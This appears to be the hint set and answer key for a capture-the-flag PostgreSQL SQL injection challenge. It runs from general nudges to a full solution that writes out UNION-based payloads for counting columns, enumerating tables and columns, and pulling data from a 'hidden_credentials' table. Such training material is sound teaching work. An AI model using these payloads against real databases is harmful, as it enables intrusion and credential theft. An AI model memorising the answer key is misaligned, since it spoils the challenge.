hints.title: Nudge
hints.content: This is PostgreSQL, not MySQL. The injection techniques are similar, but the system tables are different. PostgreSQL has its own catalog system.

hints.title: Direction
hints.content: PostgreSQL uses information_schema.tables (like MySQL) and also pg_catalog.pg_tables. You need to find user tables in the current schema (public) to locate the hidden flag table.

hints.title: Approach
hints.content: Find column count with ORDER BY. Then enumerate tables: ' UNION SELECT tablename,NULL,NULL,NULL FROM pg_catalog.pg_tables WHERE schemaname='public'-- Look for a table that doesn't belong to the normal app.

hints.title: Near-solution
hints.content: The query has 4 columns. Find tables: ' UNION SELECT tablename,NULL,NULL,NULL FROM pg_tables WHERE schemaname='public'-- finds 'hidden_credentials'. Then: ' UNION SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='hidden_credentials'-- finds columns. Extract the flag from the right column.

hints.title: Solution
hints.content: 1) Find column count: ' ORDER BY 4-- works, ' ORDER BY 5-- fails. 2) Find tables: ' UNION SELECT tablename,NULL,NULL,NULL FROM pg_tables WHERE schemaname='public'-- reveals 'hidden_credentials'. 3) Find columns: ' UNION SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='hidden_credentials'-- shows 'credential'. 4) Extract: ' UNION SELECT credential,NULL,NULL,NULL FROM hidden_credentials-- displays the flag. Note: PostgreSQL requires matching types for UNION, so NULL is used for non-text columns.
